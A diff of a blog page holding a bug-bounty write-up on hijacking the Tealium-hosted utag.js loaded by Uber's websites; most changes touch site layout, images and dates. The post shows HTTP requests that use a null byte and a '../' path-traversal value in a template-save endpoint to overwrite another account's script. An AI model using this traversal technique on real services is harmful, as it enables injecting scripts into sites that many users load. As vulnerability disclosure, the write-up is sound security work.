@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"zhchbin.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="TLDR Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag/uber/main/prod/utag.js  I found that the content of utag.js is updating from /data/utui/data/accounts/uber/template">
@@ -28,12 +28,12 @@
 <meta property="og:site_name" content="zhchbin">
 <meta property="og:description" content="TLDR Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag/uber/main/prod/utag.js  I found that the content of utag.js is updating from /data/utui/data/accounts/uber/template">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">
-<meta property="og:updated_time" content="2018-12-19T13:34:19.102Z">
+<meta property="og:image" content="http://zhchbin.github.io/images/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">
+<meta property="og:updated_time" content="2022-05-15T03:51:32.883Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[BBP系列三] Hijack the JS File of Uber&#39;s Website">
 <meta name="twitter:description" content="TLDR Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag/uber/main/prod/utag.js  I found that the content of utag.js is updating from /data/utui/data/accounts/uber/template">
-<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">
+<meta name="twitter:image" content="http://zhchbin.github.io/images/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">
 
 <link rel="canonical" href="http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/">
 
@@ -120,6 +120,16 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
@@ -156,7 +166,7 @@
     <link itemprop="mainEntityOfPage" href="http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpeg">
       <meta itemprop="name" content="Chaobin Zhang">
       <meta itemprop="description" content="">
     </span>
@@ -183,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2018-12-19 21:34:19" itemprop="dateModified" datetime="2018-12-19T21:34:19+08:00">2018-12-19</time>
+                <time title="Modified: 2022-05-15 11:51:32" itemprop="dateModified" datetime="2022-05-15T11:51:32+08:00">2022-05-15</time>
               </span>
 
           
@@ -205,18 +215,20 @@
 </ol>
 <h3 id="My-Steps"><a href="#My-Steps" class="headerlink" title="My Steps"></a>My Steps</h3><p>I like asking myself some questions when hunting for bug bounty. Looking around about <code>https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</code>, I found Uber’s websites were using a third party service offered by <code>Tealium</code>. I asked myself: can I modify the content of <code>utag.js</code>? How?</p>
 <p>I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.</p>
-<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg" alt=""></p>
+<p><img src="/images/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg" alt=""></p>
 <ul>
 <li>Post <code>/urest/legacy/saveTemplate</code> with <code>profile=main%00</code> to get the path in server</li>
 </ul>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: my.tealiumiq.com</span><br><span class="line">&lt;redated&gt;</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=profile&amp;template=profile.loader&amp;code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B</span><br></pre></td></tr></table></figure>
-<p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Response
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
 <p>As you can see, the <code>utag.loader</code> template path is <code>/data/utui/data/accounts/evilaccount/templates/main/utag.js</code></p>
 <ul>
 <li>Change the requst body to update the revision.loader</li>
 </ul>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230</span><br></pre></td></tr></table></figure>
-<p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Response
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
 <p>As you can see <code>201804081230</code> is appearing at the path. After testing, I found that I can insert <code>../</code> into this path, which means that I can change utag.js of any account, including Uber’s.</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230/../../../../&lt;victimaccount&gt;/templates/main</span><br></pre></td></tr></table></figure>
     </div>
@@ -299,12 +311,13 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#TLDR"><span class="nav-number">1.</span> <span class="nav-text">TLDR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#My-Steps"><span class="nav-number">2.</span> <span class="nav-text">My Steps</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chaobin Zhang"
+      src="/images/avatar.jpeg">
   <p class="site-author-name" itemprop="name">Chaobin Zhang</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -313,7 +326,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -323,11 +336,20 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
+          
         <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zhchbin" title="GitHub → https://github.com/zhchbin" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://hackerone.com/zhchbin" title="Hackerone → https://hackerone.com/zhchbin" rel="noopener" target="_blank"><i class="fa fa-fw"></i>Hackerone</a>
+      </span>
+  </div>
 
 
 
